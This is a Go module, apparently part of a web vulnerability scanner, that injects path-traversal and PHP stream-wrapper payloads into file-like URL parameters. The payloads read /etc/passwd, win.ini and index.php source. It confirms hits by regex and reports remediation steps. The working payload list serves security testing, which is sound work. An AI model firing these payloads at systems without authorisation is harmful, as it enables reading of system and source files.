// Package lfi tests local file inclusion and path traversal: it injects
// traversal and PHP stream-wrapper payloads into parameters that look like file
// paths and confirms a hit when local file contents come back.
package lfi

import (
	"io"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"strings"

	"github.com/sayseven7/frameseven/internal/config"
	"github.com/sayseven7/frameseven/internal/finding"
	"github.com/sayseven7/frameseven/internal/tools/v1/recon"
)

// probe is an injection payload paired with a regex that confirms a hit.
type probe struct {
	label     string
	payload   string
	signature *regexp.Regexp
}

var probes = []probe{
	{"Linux /etc/passwd", "../../../../../../etc/passwd", regexp.MustCompile(`root:.*:0:0:`)},
	{"Linux /etc/passwd (encoded)", "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", regexp.MustCompile(`root:.*:0:0:`)},
	{"Windows win.ini", "..\\..\\..\\..\\..\\windows\\win.ini", regexp.MustCompile(`(?i)\[fonts\]|\[extensions\]`)},
	{"PHP filter source disclosure", "php://filter/convert.base64-encode/resource=index.php", regexp.MustCompile(`[A-Za-z0-9+/]{120,}={0,2}`)},
}

var paramHint = regexp.MustCompile(`(?i)file|path|page|doc|document|template|include|require|load|read|view|download|dir|folder|name|content|resource`)

type response struct {
	body string
	dump string
}

// Run injects LFI/path-traversal payloads into candidate parameters.
func Run(cfg *config.Config, client *http.Client, surface *recon.Surface) []finding.Finding {
	var findings []finding.Finding
	tested := map[string]bool{}

	for _, p := range surface.Params {
		if !paramHint.MatchString(p.Name) {
			continue
		}

		u, err := url.Parse(p.Endpoint)
		if err != nil {
			continue
		}

		key := p.Name + "|" + u.Path
		if tested[key] {
			continue
		}

		tested[key] = true

		findings = append(findings, testParam(cfg, client, p)...)
	}

	return findings
}

func testParam(cfg *config.Config, client *http.Client, p recon.Param) []finding.Finding {
	var findings []finding.Finding

	for _, pr := range probes {
		resp := inject(cfg, client, p, pr.payload)
		if resp == nil || !pr.signature.MatchString(resp.body) {
			continue
		}

		findings = append(findings, finding.Finding{
			Title:       "Local file inclusion / path traversal via parameter '" + p.Name + "' (" + pr.label + ")",
			Module:      "lfi",
			Severity:    finding.High,
			OWASP:       "A01:2025 - Broken Access Control",
			CWE:         "CWE-22",
			CVSS:        8.6,
			Description: "A traversal payload returned local file contents, confirming arbitrary file read.",
			Evidence: finding.Evidence{
				Request:   resp.dump,
				Response:  trim(resp.body, 500),
				Extracted: pr.label + " via " + pr.payload,
			},
			NextSteps: []string{
				"Resolve and validate paths against an allowlisted base directory.",
				"Reject traversal sequences and disable dangerous stream wrappers (php://, file://).",
			},
		})
	}

	return findings
}

func inject(cfg *config.Config, client *http.Client, p recon.Param, payload string) *response {
	u, err := url.Parse(p.Endpoint)
	if err != nil {
		return nil
	}

	q := u.Query()
	q.Set(p.Name, payload)
	u.RawQuery = q.Encode()

	req, err := http.NewRequest(http.MethodGet, u.String(), nil)
	if err != nil {
		return nil
	}

	req.Header.Set("User-Agent", cfg.UserAgent)

	dump, _ := httputil.DumpRequestOut(req, false)

	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))

	return &response{body: string(body), dump: string(dump)}
}

func trim(s string, max int) string {
	s = strings.TrimSpace(s)
	if len(s) > max {
		return s[:max]
	}

	return s
}
